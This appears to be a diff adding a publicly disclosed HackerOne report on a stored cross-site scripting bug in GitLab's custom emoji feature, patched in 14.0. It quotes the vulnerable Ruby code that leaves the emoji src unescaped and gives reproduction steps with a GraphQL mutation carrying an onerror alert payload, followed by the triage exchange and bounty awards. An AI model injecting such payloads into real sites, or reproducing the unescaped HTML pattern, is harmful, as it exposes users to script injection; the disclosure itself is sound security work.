@@ -1,0 +1,472 @@
+{
+  "id": 1198517,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTk4NTE3",
+  "url": "https://hackerone.com/reports/1198517",
+  "title": "Stored XSS in custom emoji",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-05-15T20:12:45.283Z",
+  "submitted_at": "2021-05-15T20:12:45.437Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-07-19T13:06:59.010Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-27T12:45:24.171Z",
+  "team_member_agreed_on_going_public_at": "2021-07-19T13:06:58.862Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nI found Stored XSS with a feature of custom emoji.\n\nThis feature hasn't been rolled out yet and need to set feature flags in self management installation. ( https://gitlab.com/gitlab-org/gitlab/-/issues/231317 )\n\n\nThe problem is the code here.\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.11.4-ee/lib/gitlab/emoji.rb#L43\n\n```ruby\n    def emoji_image_tag(name, src)\n      \"<img class='emoji' title=':#{name}:' alt=':#{name}:' src='#{src}' height='20' width='20' align='absmiddle' />\"\n    end\n\n    ...\n\n    def custom_emoji_tag(name, image_source)\n      data = {\n        name: name\n      }\n\n      ActionController::Base.helpers.content_tag('gl-emoji', title: name, data: data) do\n        emoji_image_tag(name, image_source).html_safe\n      end\n    end\n```\n\nSince the `src` value of `emoji_image_tag` is not escaped, it will be XSS.\n(The value of `name` is not available for XSS as validation exists.)\n\n### Steps to reproduce\n\nThe following steps should to be reproduced in a self-managed installation of gitlab.\n\n 1. Set feature_flag\n\nsee https://docs.gitlab.com/ee/administration/feature_flags.html\n\n```\n# gitlab-rails console\n--------------------------------------------------------------------------------\n Ruby:         ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]\n GitLab:       13.11.3 (b321336e443) FOSS\n GitLab Shell: 13.17.0\n PostgreSQL:   12.6\n--------------------------------------------------------------------------------\nLoading production environment (Rails 6.0.3.6)\nirb(main):001:0> Feature.enable(:custom_emoji)\n=> true\n```\n\n\n 2. Create group\n\nCreate a group to set the custom emoji. For example, `xss_target`.\n\n\n 3. Create custom emoji\n\nThe ability to create custom emoji only exists in graphql api.\n\nCreate by sending the following query from the graphiql page of `https://localhost/-/graphql-explorer`.\n\n```\nmutation {\n  createCustomEmoji(input: \n    {\n      groupPath: \"xss_target\", \n      name:\"xssreplace\",\n      url:\"http://aaa#'><img onerror=alert(location) src=.>\"\n    }) {\n    customEmoji {\n      id\n      name\n      url\n    }\n  }\n}\n```\n\n{F1302828}\n\n 4. Create project and file\n\nCreate a project to display custom emojis and create a `README.md` with the following content.\n\n```\n:xssreplace:\n```\n\n\n5. View rendering results in browser\n\nThe function of custom emoji replaces the `:xssreplace:` part to become Stored XSS.\n\n### Impact\n\nStored XSS is possible with gitlab with feature flags set.\n\n### Examples\n\nThere is no example because it works only with gitlab with feature flag set.\n\n### What is the current *bug* behavior?\n\nInsufficient escape of `src`.\n\n### What is the expected *correct* behavior?\n\nEscape the value of `src`.\n\n### Relevant logs and/or screenshots\n\n{F1302824}\n\n### Output of checks\n\nGitLab.com doesn't have a feature flag set so it doesn't affect.\n\n#### Results of GitLab environment info\n\n```\n# gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.2p137\nGem Version:\t3.1.4\nBundler Version:2.1.4\nRake Version:\t13.0.3\nRedis Version:\t6.0.12\nGit Version:\t2.31.1\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.11.3\nRevision:\tb321336e443\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.6\nURL:\t\thttps://gitlab.example.com\nHTTP Clone URL:\thttps://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t13.17.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nStored XSS is possible with gitlab with feature flags set.",
+  "bounty_amount": "3000.0",
+  "formatted_bounty": "$3,000",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1302824,
+      "file_name": "custom_emoji_xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uu2zrxl3kbpuqj36odcqpcvh2mzm?response-content-disposition=attachment%3B%20filename%3D%22custom_emoji_xss.png%22%3B%20filename%2A%3DUTF-8%27%27custom_emoji_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071058Z&X-Amz-Expires=1843&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=60481046f02fe0f585148e8239ac4bdb5ac7ecdef4237310cb29de856b43f49f",
+      "file_size": 601668,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1302828,
+      "file_name": "graphql.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t2mdzeskto9otmzhd090fewakcag?response-content-disposition=attachment%3B%20filename%3D%22graphql.png%22%3B%20filename%2A%3DUTF-8%27%27graphql.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071058Z&X-Amz-Expires=1843&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=941d72627e7d22ad7d48f1af5ae4c77e9823ea0e8bccbe9b3c34e37c7eb8a2df",
+      "file_size": 622443,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 121,
+  "voters": [
+    "bloody_eye",
+    "rootz491",
+    "theranger",
+    "bncrypted",
+    "joaxcar",
+    "baldev123",
+    "dninjadave",
+    "arw9234",
+    "cypher-28",
+    "drsniper",
+    "and 111 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 55897,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://gitlab.com/gitlab-org/gitlab",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 11771702,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @ooooooo_q,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@ktistai",
+      "automated_response": false,
+      "created_at": "2021-05-17T09:32:04.647Z",
+      "updated_at": "2021-05-17T09:32:04.647Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11786358,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @ooooooo_q,\n\nThis looks more like a self XSS since you need the right permissions to be able to save the payload. I'm not even sure such a commit would pass a review, thus I don't see how this can be exploited in real life. Am I missing anything here? \n\nThanks, \n@ktistai",
+      "automated_response": false,
+      "created_at": "2021-05-18T09:00:55.087Z",
+      "updated_at": "2021-05-18T09:00:55.087Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11786739,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "@ktistai \n\nYes, the attacker needs permission to add a custom emoji to the group.\nBut browsing files is not. An attacker can also attack other users who browse the repository by setting the disclosure range of the group or project to pubic or internal. (https://docs.gitlab.com/ee/public_access/public_access.html)",
+      "automated_response": false,
+      "created_at": "2021-05-18T09:32:33.235Z",
+      "updated_at": "2021-05-18T09:32:33.235Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11874059,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @ooooooo_q\n\nI'm checking this internally with the team and will update you asap if it will be accepted. Right now it looks more like a self XSS than an actual issue. \n\nRegards, \n@ktistai",
+      "automated_response": false,
+      "created_at": "2021-05-25T09:45:09.921Z",
+      "updated_at": "2021-05-25T09:45:09.921Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11897481,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello @ooooooo_q,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/331982.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $500 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-05-27T01:13:54.403Z",
+      "updated_at": "2021-05-27T01:13:54.403Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11897483,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-27T01:14:08.721Z",
+      "updated_at": "2021-05-27T01:14:08.721Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      }
+    },
+    {
+      "id": 11909543,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ETA for fix:\n\nHi @ooooooo_q,\n\nThe issue you reported is currently scheduled to be fixed by 2021-06-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2021-05-28T04:08:06.123Z",
+      "updated_at": "2021-05-28T04:08:06.123Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12025336,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-06-08T16:58:00.794Z",
+      "updated_at": "2021-06-08T16:58:00.794Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "High",
+        "old_severity_id": 1086083,
+        "new_severity_id": 1110232
+      },
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12025359,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi,\n\nThank you again for the report! Your finding has been patched in the `main` branch of GitLab and the fix will be released in 14.0. Congratulations! Since this was hidden behind a feature flag we're not going through the regular security release process and will not issue a CVE but it has no impact on the bounty amount.\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-06-08T17:00:09.416Z",
+      "updated_at": "2021-06-08T17:00:09.416Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12025371,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-06-08T17:00:48.282Z",
+      "updated_at": "2021-06-08T17:00:48.282Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_amount": "2500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      }
+    },
+    {
+      "id": 12261615,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-06-27T12:45:24.215Z",
+      "updated_at": "2021-06-27T12:45:24.215Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12567266,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-19T13:06:58.897Z",
+      "updated_at": "2021-07-19T13:06:58.897Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12567267,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-19T13:06:59.061Z",
+      "updated_at": "2021-07-19T13:06:59.061Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
